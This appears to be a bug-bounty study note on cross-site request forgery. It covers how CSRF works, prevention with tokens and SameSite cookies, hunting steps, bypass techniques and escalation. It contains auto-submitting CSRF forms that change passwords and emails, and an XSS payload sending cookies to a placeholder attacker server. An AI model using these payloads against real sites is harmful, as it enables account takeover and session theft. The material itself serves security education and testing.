CSRF attacks specifically target state-changing requests, like sending tweets and modifying user settings, instead of requests that reveal sensitive user info. This is because attackers won’t be able to read the response to the forged requests sent during a CSRF attack
# Mechanisms
web applications authenticate their users and manage user sessions by using session cookies.
with your session cookie, you can carry out authenticated actions like accessing confidential information, changing your password, or sending a private message without reentering your password 

**example scenario:** the attacker can host the following HTML that sends request to twitter and then sends it to the victim 
```html
<html>
	<!--making the iframe invisable-->
	<iframe style="display:none" name="csrf-frame"> 
		<!--form that send post request to twitter send tweet-->
		<form method="POST" action="https://twitter.com/send_a_tweet"
		target="csrf-frame" id="csrf-form"> 
			 <input type="text" name="tweet_content" value="Hunter">
			 <input type='submit' value="Submit">
		 </form>
	 </iframe>
<!--submit the form the id "csrf-form" automatically without user interaction-->
	 <script>document.getElementById("csrf-form").submit();</script>
 </html>
```
when victim visits the attackers site the form will send the tweet automatically, the thing here is the browser include the session cookie automatically with every request so the request here is valid since the victim cookie included 
## CSRF attack is possible if:
- **A relevant action:** There is an action within the application that the attacker has a reason to induce. This might be a privileged action (such as modifying permissions for other users) or any action on user-specific data (such as changing the user's own password).
- **Cookie-based session handling.** Performing the action involves issuing one or more HTTP requests, and the application relies solely on session cookies to identify the user who has made the requests. There is no other mechanism in place for tracking sessions or validating user requests.
- **No unpredictable request parameters.** The requests that perform the action do not contain any parameters whose values the attacker cannot determine or guess. For example, when causing a user to change their password, the function is not vulnerable if an attacker needs to know the value of the existing password.

example request to change email functionality
```
POST /email/change HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 30 
Cookie: session=yvthwsztyeQkAPzeQ5gHgTvlyxHfsAfE

email=wiener@normal-user.com
```

This meets the conditions required for CSRF:
- The action of changing the email address on a user's account is of interest to an attacker. Following this action, the attacker will typically be able to trigger a password reset and take full control of the user's account.
- The application uses a session cookie to identify which user issued the request. There are no other tokens or mechanisms in place to track user sessions.
- The attacker can easily determine the values of the request parameters that are needed to perform the action.

we can exploit it using HTML form like 
```html
<html>
	<body>
		<form action="https://vulnerable-website.com/email/change" method="POST">
			<input type="hidden" name="email" value="Hunter@evil-user.net" />
		</form>
	<script> document.forms[0].submit(); </script>
	</body>
</html>
```

>Although CSRF is normally described in relation to cookie-based session handling, it also arises in other contexts where the application automatically adds some user credentials to requests, such as HTTP Basic authentication and certificate-based authentication.

# Prevention
>The best way to prevent CSRFs is to use **CSRF tokens**

- **CSRF Tokens** : a unique, secret, and unpredictable value that is generated by the server-side application and shared with the client. 
	- Token should be unique for each session and/or HTML form so attackers can’t guess the token’s value.
	- Tied with the user session.
	- Tokens should be unpredictable with high entropy so it can't be analyzed.
	- Use the built-in Framework's Implementation for CSRF tokens.
	- Tokens should be transmitted within a hidden field of HTML form or custom header (not common).
	- Tokens generally should not be transmitted within Cookies or URL parameters.
	- Tokens should be generated and saved in the server side in the user session.
	- Validation should be performed regardless the HTTP method (POST, GET, etc..)
	- Request must be rejected when there's no CSRF tokens present or with empty value
	
- **SameSite cookies** : SameSite is a browser security mechanism that determines when a website's cookies are included in requests originating from other websites. (Strict, Lax, None)
- **Referer-based validation**: applications make use of the HTTP Referer header normally by verifying that the request originated from the application's own domain (less secure).  
# Hunting for CSRFs

>start by discovering state-changing requests that aren’t shielded by CSRF protections
>Remember that because browsers like Chrome offer automatic CSRF protection, you need to test with another browser, such as **Firefox**.
## Step 1: Spot State-Changing Actions
1. log in to your target site and browse through it in search of any activity that alters data (state changing request).
2. Go through all the app’s functionalities, clicking all the links. Intercept the generated requests with a proxy like Burp and write down their URL endpoints, Record these endpoints one by one in a list like the following:
	- Change password: `email.example.com/password_change `POST request
	   Request parameters: `new_password`
	- Send email: `email.example.com/send_email` POST request
	  Request parameters: `draft_id`, `recipient_id`

## Step 2: Look for a Lack of CSRF Protections
- Using Burp go for the endpoints u listed at the first step and start inspect for any CSRF protection and Make sure they are satisfying all the 3 conditions discussed earlier: [[#CSRF attack is possible if]]
- Use the search bar at the bottom of the window to look for the string "csrf" or "state". 
- **CSRF tokens** can come in many forms besides POST body parameters; they sometimes show up in request headers, cookies, and URL parameters as well. For example, they might show up like the cookie here:
```
POST /password_change
Host: email.example.com
Cookie: session_cookie=YOUR_SESSION_COOKIE; csrf_token=871caef0757a4ac9691aceb9aad8b65b

(POST request body)
new_password=abc123
```
## Step 3: Confirm the Vulnerability
After you’ve found a potentially vulnerable endpoint, you’ll need to confirm the vulnerability, by crafting a malicious HTML form that imitates the request sent by the legitimate site:
### HTML Template
```html
<html>
	 <form method="POST" action="https://email.example.com/password_change" id="csrf-form">
		 <input type="text" name="new_password" value="Hunter123">
		 <input type="submit" value="Submit">
	 </form>
	<script>document.getElementById("csrf-form").submit();</script>
 </html>
```
open it, it should generate a request that change the password, check if the password changed to "Hunter123" in other words, check if the **target server has accepted the request**
>The goal is to prove that a foreign site can carry out state-changing actions on a user’s behalf
# Bypassing CSRF Protection

## Exploit Clickjacking
for more info and detailed guide on Clickjacking take look at [[Clickjacking]] 
If the endpoint uses CSRF tokens but the page itself is vulnerable to clickjacking, You exploit the Clickjacking to achieve the CSRF.
by framing the page in a malicious site while having the state-changing request originate from the legitimate site. If the page where the vulnerable endpoint is located is vulnerable to clickjacking, you’ll be able to achieve the same results as a CSRF attack on the endpoint

## Change the Request Method
#### example
POST request of the password-change endpoint is protected by a CSRF token like this:
```
POST /password_change
Host: email.example.com
Cookie: session_cookie=YOUR_SESSION_COOKIE

(POST request body)
new_password=abc123&csrf_token=871caef0757a4ac9691aceb9aad8b65b
```

change it to GET request and see if you can get away with not providing a **CSRF token**:
```
GET /password_change?new_password=abc123
Host: email.example.com
Cookie: session_cookie=YOUR_SESSION_COOKIE
```

In this case, your malicious HTML page could simply look like this:
```html
<html>
<!--<img> tag will send a GET request to the URL specified in its src attribute-->
  <img src="https://email.example.com/password_change?new_password=abc123"/>
</html>
```

if the password change occurs after you load this HTML page, you can confirm that the endpoint is vulnerable to CSRF via a GET request
On the other hand, if the original action normally uses a GET request, you can try converting it into a POST request instead.
## Bypass CSRF Tokens Stored on the Server
Just because a site uses CSRF tokens doesn’t mean it is validating them properly
- First, try deleting the token parameter or sending a blank token parameter
- try sending the a blank `csrf_token` parameter: `new_password=abc123&csrf_token=`
  these tricks works because of a common application logic mistake. 
  
  Applications sometimes check the validity of the token only if the token exists, or if the token parameter is not blank.
The code for an insecure application’s validation mechanism might look roughly like this:
```python
def validate_token():
 if (request.csrf_token == session.csrf_token):
 pass
 else:
 throw_error("CSRF token incorrect. Request rejected.")
[...]
def process_state_changing_action():
 if request.csrf_token:
 validate_token()
 execute_action()
```


- Try submitting the request with another session’s CSRF token, This works because some applications might check only whether the token is valid, without confirming that it belongs to the current user.
- Test it by providing your own token in the place of the legitimate token also You can create another test account to generate tokens if you don’t want to use your own tokens.

## Bypass Double-Submit CSRF Tokens

> [!double-submit cookie] double-submit cookie
> In this technique, the state-changing request contains the same random token as both a cookie and a request parameter, and the server checks whether the two values are equal. If the values match, the request is seen as legitimate. Otherwise, the application rejects it.
> 
> In this system, it does not matter whether the tokens themselves are valid or legitimate. The server checks only whether the token in the cookies is the same as the token in the request parameters

the following request is valid in the double-submit cookie system:
```
POST /password_change
Host: email.example.com
Cookie: session_cookie=YOUR_SESSION_COOKIE; csrf_token=not_a_real_token
(POST request body)
new_password=abc123&csrf_token=not_a_real_token
```

Generally you can't change another user's cookie, But if you can find a way to make the victim’s browser send along a fake cookie, you’ll be able to execute the CSRF
the attack will look like this:
1. use a session-fixation technique to make the victim’s browser store whatever value you choose as the CSRF token cookie.
   
> [!NOTE] Session fixation
> an attack that allows attackers to select the session cookies of the victim
> for further information take a look at [Session fixation - Wikipedia](https://en.wikipedia.org/wiki/Session_fixation)

2. Then, you’d execute the CSRF with the same CSRF token that you chose as the cookie.
## Bypass CSRF Referer Header Check
Try to remove `referer header` by adding a `<mata>` tag to the page hosting your request form 
```html
<html>
<!--This particular tag tells the browser to not include a referer header in the resulting HTTP request-->
 <meta name="referrer" content="no-referrer">
 <form method="POST" action="https://email.example.com/password_change" id="csrf-form">
 <input type="text" name="new_password" value="abc123">
 <input type='submit' value="Submit">
 </form>
 <script>document.getElementById("csrf-form").submit();</script>
</html>
```

Broken Code:
```python

def validate_referer():
  if (request.referer in allowlisted_domains):
    pass
 else:
   throw_error("Referer incorrect. Request rejected.")
[...]
def process_state_changing_action():
 if request.referer:
   validate_referer()
 execute_action()

```


### bypass the logic check used to validate the referer URL
the app check if the referrer containing the domain like "example.com"

-  In this case, you can bypass the referer check by placing the victim domain name in the referer URL as a subdomain. You can achieve this by creating a subdomain named after the victim’s domain, and then hosting the malicious HTML on that subdomain, like:
```
POST /password_change
Host: email.example.com
Cookie: session_cookie=YOUR_SESSION_COOKIE;
Referer: example.com.attacker.com

(POST request body)
new_password=abc123
```

- You can also try placing the victim domain name in the referer URL as a pathname. You can do so by creating a file with the name of the target’s domain and hosting your HTML page there, it will look like this: `Referer: attacker.com/example.com`

## Bypass CSRF Protection by Using XSS
any XSS vulnerability will defeat CSRF protections, because XSS will allow attackers to steal the legitimate CSRF token and then craft forged requests by using `XMLHttpRequest`.
Often, attackers will find XSS as the starting point to launch CSRFs to take over admin accounts.

# Escalating the Attack
## Leak User Information by Using CSRF
Applications often send or disclose information according to user preferences
let’s say the `example.com` web application sends monthly billing emails to a user email address.
so if it's vulnerable to CSRF we can change these emails to ours and the app will send the billing information to us instead of the user, the following request will make it clear
```
POST /change_billing_email
Host: example.com
Cookie: session_cookie=YOUR_SESSION_COOKIE;

(POST request body)
email=ATTACKER_EMAIL&csrf_token=
```
## Create Stored Self-XSS by Using CSRF
let’s say that `example.com`’s financial subdomain, finance .example.com, gives users the ability to create nicknames for each of their linked bank accounts. The account nickname field is vulnerable to self-XSS: there is no sanitization, validation, or escaping for user input on the field. However, only the user can edit and see this field, so there is no way for an attacker to trigger the XSS directly.
However, the endpoint used to change the account nicknames is vulnerable to CSRF.
The application doesn’t properly validate the existence of the CSRF token
```
POST /change_account_nickname
Host: finance.example.com
Cookie: session_cookie=YOUR_SESSION_COOKIE

(POST request body)
account=0
&nickname="<script>document.location='http://attacker_server_ip/
cookie_stealer.php?c='+document.cookie;</script>"
```
This request will change the user’s account nickname and store the XSS payload there. The next time a user logs into the account and views their dashboard, they’ll trigger the XSS
## Take Over User Accounts by Using CSRF
Sometimes CSRF can even lead to account takeover, this happen if the CSRF occurs on high impact endpoint like 
```
POST /set_password
Host: example.com
Cookie: session_cookie=YOUR_SESSION_COOKIE;
(POST request body)
password=XXXXX&csrf_token=
```

this can automatically assign the password of any user who visits the malicious page
```html
<html>
 <form method="POST" action="https://email.example.com/set_password" id="csrf-form">
 <input type="text" name="new_password" value="this_account_is_now_mine">
 <input type="text" name="csrf_token" value="">
 <input type='submit' value="Submit">
 </form>
 <script>document.getElementById("csrf-form").submit();</script>
</html>
```
# Delivering the CSRF Payload
- First and easiest way is by tricking users into visiting an external malicious site
- GET-CSRF `<img src="https://email.example.com/set_password?new_password=this_account_is_now_mine">` as an image posted to a forum. This way, any user who views the forum page would be affected
- using Stored XSS, an attacker can submit a stored-XSS payload there to make any forum visitor execute the attacker’s malicious script
```javascript
<script>
 document.body.innerHTML += "<form method="POST" action="https://email.example.com/set_password" id="csrf-form">
 <input type="text" name="new_password" value="this_account_is_now_mine">
 <input type='submit' value="Submit">
 </form>";
 document.getElementById("csrf-form").submit();
</script>
```


# Finding Your First CSRF!
1. Spot the state-changing actions on the application and keep a note on their locations and functionality.
2. Check these functionalities for CSRF protection. If you can’t spot any protections, you might have found a vulnerability
3. If any CSRF protection mechanisms are present, try to bypass the protection by using the protection-bypass techniques
4. Confirm the vulnerability by crafting a malicious HTML page and visiting that page to see if the action has executed.
5. Think of strategies for delivering your payload to end users.
6.  Draft your first CSRF report!
# Resources
- [Bug Bounty Bootcamp book](https://www.amazon.eg/-/en/Bug-Bounty-Bootcamp-Reporting-Vulnerabilities/dp/1718501544)
- [Rana Kalil's Video - Cross-Site Request Forgery (CSRF) | Complete Guide](https://www.youtube.com/watch?v=7bTNMSqCMI0&list=PLuyTk2_mYISKNFqao_NBzYOWvJFqhVmXN&index=1&t=1509s)
- [OWASP Cheat Sheet Series- CSRF Prevention Cheat Sheet ](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)

